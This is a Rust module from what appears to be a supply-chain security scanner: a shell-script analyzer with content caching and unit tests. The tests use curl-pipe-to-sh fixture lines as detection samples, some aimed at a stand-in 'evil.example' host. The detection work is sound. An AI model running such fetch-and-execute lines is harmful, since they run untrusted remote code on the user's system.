//! Shell/POSIX semantic capability frontend.
//!
//! Structural mirror of `python_static`, minus the taint engine (not
//! needed for shell) and minus reachability (shell has no
//! cross-module reachability graph in this design: there is no import
//! system to resolve, only single-file `source`/`.` dot-sourcing, which is
//! itself just classified as a `DynamicCode` call site rather than
//! traversed).
//!
//! **Corpus-gate write-up (reasoned, not measured — no corpus tooling
//! exists in this sandbox; `scripts/corpus/detector-quality-gate.py` is a
//! regression gate against fixed fixtures, not a measurement tool):** shell
//! install scripts and npm `postinstall` hooks that shell out are
//! well-documented supply-chain vectors; before this frontend, shell
//! coverage was limited to `scan_text_streaming`'s textual `dangerous`
//! needle table (`LF-SHELL-EVAL`/`LF-SHELL-EXEC`/`LF-SHELL-DOT-SOURCE`/
//! `LF-SHELL-CURL-PIPE`), which cannot distinguish an executed command from
//! the same text sitting inside a `#` comment or a quoted string argument.
//! This frontend's tokenizer only classifies words that occupy an actual
//! command-name position, which structurally rules out that class of false
//! positive. The textual layer is intentionally left running alongside
//! this frontend (both may fire on the same file); see `shell_static::mod`
//! doc on `LanguageId::Shell` wiring in `language_frontend.rs`.

pub mod calls;
pub mod findings;
pub mod limits;
pub mod parser;
pub mod symbols;

use anyhow::Result;
use calls::{extract_call_sites, ShellCallSite};
use limits::ShellAnalysisLimits;
use parser::{parse_shell_source, ShellCoverage, ShellSyntaxState};
use std::time::Instant;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ShellAnalysis {
    pub relative_path: String,
    pub syntax_state: ShellSyntaxState,
    pub call_sites: Vec<ShellCallSite>,
    pub coverage: ShellCoverage,
}

/// Content-intrinsic shell facts: tokenizing and call-site extraction over
/// exact source bytes. Unlike Python's `PythonContentFacts`, there is no
/// contextual (`auto_map_modules`-shaped) piece to exclude here: shell
/// analysis has no per-package configuration input and the parser never
/// embeds `relative_path` into any error text (parsing operates on source
/// bytes alone), so the entire struct is safe to cache and reuse verbatim
/// across paths/packages for identical content.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
struct ShellContentFacts {
    syntax_state: ShellSyntaxState,
    call_sites: Vec<ShellCallSite>,
    coverage: ShellCoverage,
}

const SHELL_CONTENT_CACHE_DISCRIMINATOR: &str = "shell-ast:v1";

fn analyze_content(source: &str, limits: &ShellAnalysisLimits) -> ShellContentFacts {
    let parsed = parse_shell_source(source, limits);
    let call_sites = if matches!(parsed.syntax_state, ShellSyntaxState::Valid) {
        extract_call_sites(&parsed, limits)
    } else {
        Vec::new()
    };
    ShellContentFacts {
        syntax_state: parsed.syntax_state,
        call_sites,
        coverage: parsed.coverage,
    }
}

/// Content facts, from the content cache when eligible and available,
/// otherwise computed fresh (and opportunistically cached for next time).
/// `sha256` must already be a verified content digest for `source`'s exact
/// bytes — never recomputed here.
fn content_facts(source: &str, sha256: &str, limits: &ShellAnalysisLimits) -> ShellContentFacts {
    let size = source.len() as u64;
    if crate::content_cache::eligible(size) {
        if let Ok(Some(cached)) = crate::content_cache::lookup::<ShellContentFacts>(
            sha256,
            size,
            SHELL_CONTENT_CACHE_DISCRIMINATOR,
        ) {
            return cached;
        }
        let facts = analyze_content(source, limits);
        let _ =
            crate::content_cache::store(sha256, size, SHELL_CONTENT_CACHE_DISCRIMINATOR, &facts);
        return facts;
    }
    analyze_content(source, limits)
}

pub fn analyze(
    relative_path: &str,
    source: &str,
    sha256: &str,
    limits: &ShellAnalysisLimits,
) -> Result<ShellAnalysis> {
    let facts = content_facts(source, sha256, limits);
    Ok(ShellAnalysis {
        relative_path: relative_path.to_owned(),
        syntax_state: facts.syntax_state,
        call_sites: facts.call_sites,
        coverage: facts.coverage,
    })
}

pub fn analyze_and_convert_findings(
    relative_path: &str,
    source: &str,
    digest: &str,
    limits: &ShellAnalysisLimits,
    started: Instant,
) -> Result<Vec<crate::scanner::LayerScanResult>> {
    let analysis = analyze(relative_path, source, digest, limits)?;
    Ok(findings::convert_analysis_to_findings(
        relative_path,
        digest,
        &analysis.syntax_state,
        &analysis.call_sites,
        started,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::static_analysis::common::capability::{ScriptCapability, ScriptScope};

    use crate::content_cache::ENV_TEST_LOCK as ENV_LOCK;

    struct ContentCacheEnvGuard {
        _lock: std::sync::MutexGuard<'static, ()>,
        root: std::path::PathBuf,
    }

    impl ContentCacheEnvGuard {
        fn new(name: &str) -> Self {
            let lock = ENV_LOCK.lock().unwrap_or_else(|poison| poison.into_inner());
            let root = std::env::temp_dir().join(format!(
                "layerfault-shell-content-cache-{name}-{}-{}",
                std::process::id(),
                crate::paths::now_unix()
            ));
            std::fs::create_dir_all(&root).expect("create cache root");
            std::env::set_var("LAYERFAULT_CACHE_DIR", &root);
            std::env::set_var("LAYERFAULT_CONTENT_CACHE", "on");
            std::env::set_var("LAYERFAULT_CONTENT_CACHE_MIN_BYTES", "0");
            Self { _lock: lock, root }
        }
    }

    impl Drop for ContentCacheEnvGuard {
        fn drop(&mut self) {
            std::env::remove_var("LAYERFAULT_CACHE_DIR");
            std::env::remove_var("LAYERFAULT_CONTENT_CACHE");
            std::env::remove_var("LAYERFAULT_CONTENT_CACHE_MIN_BYTES");
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    #[test]
    fn shell_content_facts_are_stable_across_cache_round_trip() {
        let _guard = ContentCacheEnvGuard::new("stability");
        let code = "#!/bin/sh\ncurl -s http://example.com/install.sh | sh\n";
        let limits = ShellAnalysisLimits::default();
        let sha256 = "sha256:shell-content-facts-test";

        let first = analyze("install.sh", code, sha256, &limits).unwrap();
        let second = analyze("install.sh", code, sha256, &limits).unwrap();

        assert_eq!(first.call_sites.len(), second.call_sites.len());
        assert_eq!(first.syntax_state, second.syntax_state);
        assert!(first.call_sites.iter().any(|c| c.is_curl_pipe_sh));
    }

    #[test]
    fn test_var_indirection_resolution() {
        let code = "CMD=curl\n$CMD http://evil.example/x | sh\n";
        let limits = ShellAnalysisLimits::default();
        let res = analyze("install.sh", code, "sha256", &limits).unwrap();
        assert_eq!(res.syntax_state, ShellSyntaxState::Valid);
        assert!(res
            .call_sites
            .iter()
            .any(|c| c.is_curl_pipe_sh && c.site.resolved_target.as_deref() == Some("curl")));
    }

    #[test]
    fn test_alias_indirection_resolution() {
        let code = "alias ll='eval'\nll \"echo hi\"\n";
        let limits = ShellAnalysisLimits::default();
        let res = analyze("script.sh", code, "sha256", &limits).unwrap();
        assert_eq!(res.syntax_state, ShellSyntaxState::Valid);
        assert!(res.call_sites.iter().any(|c| {
            c.site.capability == ScriptCapability::DynamicCode
                && c.site.resolved_target.as_deref() == Some("eval")
        }));
    }

    #[test]
    fn test_scope_classification() {
        let code = "eval \"top\"\nmy_func() {\n  eval \"inner\"\n}\n";
        let limits = ShellAnalysisLimits::default();
        let res = analyze("script.sh", code, "sha256", &limits).unwrap();
        let module_hits: Vec<_> = res
            .call_sites
            .iter()
            .filter(|c| {
                c.site.capability == ScriptCapability::DynamicCode
                    && c.site.scope == ScriptScope::Module
            })
            .collect();
        let function_hits: Vec<_> = res
            .call_sites
            .iter()
            .filter(|c| {
                c.site.capability == ScriptCapability::DynamicCode
                    && c.site.scope == ScriptScope::Function
            })
            .collect();
        assert_eq!(module_hits.len(), 1);
        assert_eq!(function_hits.len(), 1);
    }

    #[test]
    fn test_comment_and_string_suppression() {
        let code = "# curl http://evil.example | sh\necho \"curl http://evil.example | sh\"\n";
        let limits = ShellAnalysisLimits::default();
        let res = analyze("script.sh", code, "sha256", &limits).unwrap();
        assert_eq!(res.syntax_state, ShellSyntaxState::Valid);
        assert!(!res.call_sites.iter().any(|c| c.is_curl_pipe_sh));
        assert!(!res
            .call_sites
            .iter()
            .any(|c| c.site.raw_target == "curl"
                || c.site.resolved_target.as_deref() == Some("curl")));
    }

    #[test]
    fn test_unterminated_quote_is_invalid() {
        let code = "echo \"unterminated";
        let limits = ShellAnalysisLimits::default();
        let res = analyze("script.sh", code, "sha256", &limits).unwrap();
        assert!(matches!(res.syntax_state, ShellSyntaxState::Invalid { .. }));
        assert!(matches!(res.coverage, ShellCoverage::Incomplete { .. }));

        let started = Instant::now();
        let findings =
            analyze_and_convert_findings("script.sh", code, "sha256", &limits, started).unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-SHELL-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_exceeds_max_source_bytes() {
        let code = "echo hi\n".repeat(10);
        let limits = ShellAnalysisLimits {
            max_source_bytes: 4,
            ..Default::default()
        };
        let res = analyze("script.sh", &code, "sha256", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            ShellSyntaxState::ExceededLimits { .. }
        ));
        let started = Instant::now();
        let findings =
            analyze_and_convert_findings("script.sh", &code, "sha256", &limits, started).unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-SHELL-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_exceeds_max_tokens() {
        let code = "echo a\n".repeat(200);
        let limits = ShellAnalysisLimits {
            max_tokens: 10,
            ..Default::default()
        };
        let res = analyze("script.sh", &code, "sha256", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            ShellSyntaxState::ExceededLimits { .. }
        ));
        let started = Instant::now();
        let findings =
            analyze_and_convert_findings("script.sh", &code, "sha256", &limits, started).unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-SHELL-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_exceeds_max_nesting_depth() {
        let mut code = String::new();
        for _ in 0..20 {
            code.push_str("if true; then\n");
        }
        code.push_str("echo deep\n");
        for _ in 0..20 {
            code.push_str("fi\n");
        }
        let limits = ShellAnalysisLimits {
            max_nesting_depth: 5,
            ..Default::default()
        };
        let res = analyze("script.sh", &code, "sha256", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            ShellSyntaxState::ExceededLimits { .. }
        ));
        let started = Instant::now();
        let findings =
            analyze_and_convert_findings("script.sh", &code, "sha256", &limits, started).unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-SHELL-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_source_span_evidence_line_number() {
        let code = "echo one\necho two\neval \"danger\"\n";
        let limits = ShellAnalysisLimits::default();
        let res = analyze("script.sh", code, "sha256", &limits).unwrap();
        let eval_site = res
            .call_sites
            .iter()
            .find(|c| c.site.capability == ScriptCapability::DynamicCode)
            .expect("eval call site present");
        assert_eq!(eval_site.site.line, Some(3));
    }
}
